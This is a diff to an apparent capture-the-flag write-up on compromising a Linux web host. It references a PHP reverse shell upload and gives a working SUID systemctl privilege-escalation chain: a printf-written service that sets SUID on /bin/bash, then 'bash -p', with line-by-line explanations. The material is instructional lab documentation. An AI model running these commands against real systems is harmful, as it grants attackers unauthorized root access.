@@ -75,7 +75,7 @@ Tool: Burp Suite - used for web traffic interception and manipulation
 
 ![php reverse shell file upload](screenshots/upload_reverse_shell.png)
 
-5. Visit `http://[target IP]:[target port]/internal/uploads/[PHP reverse shell filename]`
+6. Visit `http://[target IP]:[target port]/internal/uploads/[PHP reverse shell filename]`
 
 ![reverse shell](screenshots/reverse_shell.png)
 - netcat should catch the shell after that
@@ -84,17 +84,41 @@ Tool: Burp Suite - used for web traffic interception and manipulation
 
 ### Privilege Escalation
 1. Look for files with SUID
-   - Command: `find / -perm 4000 -type f 2>/dev/null`
+   - Command: `find / -perm -4000 -type f 2>/dev/null`
        - `find` - a command for finding files
        - `/` - start from the highest directory/search all directories
-       - `-perm 4000 -type f` - search for files with SUID permissions
+       - `-perm -4000 -type f` - search for files with SUID permissions
        - `2>/dev/null` - put error messages to /dev/null
-   - Set User ID (SUID) - files with these permission run with the permission of the owner
 2. Exploit `/bin/systemctl` with SUID using the following commands:
-      1. `printf "[Service]\nType=onsehot\nExecStart=/bin/sh -c 'chmod +s /bin/bash'\n[Install]\nWantedBy=multi-user.target\m" > /tmp/exploit.service`
+      1. `printf "[Service]\nType=oneshot\nExecStart=/bin/sh -c 'chmod +s /bin/bash'\n[Install]\nWantedBy=multi-user.target\n" > /tmp/exploit.service`
       2. `/bin/systemctl link /tmp/exploit.service`
       3. `/bin/systemctl enable --now /tmp/exploit.service`
       4. `bash -p`
   
 ![systemctl exploitation](screenshots/exploit_systemctl_suid.png)
 
+--- 
+
+## Technicalities
+- Reverse Shell
+   - forcing the target machine to drop a shell or give access to the attacker via outbound connections
+   - it is because most inbound connections are checked by firewalls
+- Inbound Connection - connection from an outside source to the machine
+- Outbound Connection -  connection from the machine to an outside machine
+- Privilege Escalation Logic:
+   - `systemctl` - a root-owned command-line tool used to manage services on Linux
+   - `Set User ID (SUID)` - files with these permission run with the permission of the owner
+      - Running `systemctl` with SUID allows the user to run it with the permission of the owner (root)
+   -  `printf "[Service]\nType=oneshot\nExecStart=/bin/sh -c 'chmod +s /bin/bash'\n[Install]\nWantedBy=multi-user.target\n" > /tmp/exploit.service`
+      - `printf "..." > /tmp/exploit.service` - write a text-content to a created service file on a low-level directory
+      - `\n` - the next character/string will be written on the next line
+      - `[Service]` - tell how the service behaves
+      - `Type=oneshot` - the service will be executed once instead of being ran on the background
+      - `ExecStart=/bin/sh -c 'chmod +s /bin/bash'`
+         - `ExecStart=/bin/sh -c` - spawn a shell upon start that will execute the command after it
+         - `chmod +s /bin/bash` - add a SUID permission to `/bin/bash`, a Linux interpreter
+   - `/bin/systemctl link /tmp/exploit.service`
+      -  creates a link that will allow `systemctl` to recognize and run the created service file
+      -  can be executed because the `systemctl` was ran as the root
+   - `/bin/systemctl enable --now /tmp/exploit.service` - executes the file immediately
+   - `bash -p` - spawn a shell in privileged mode
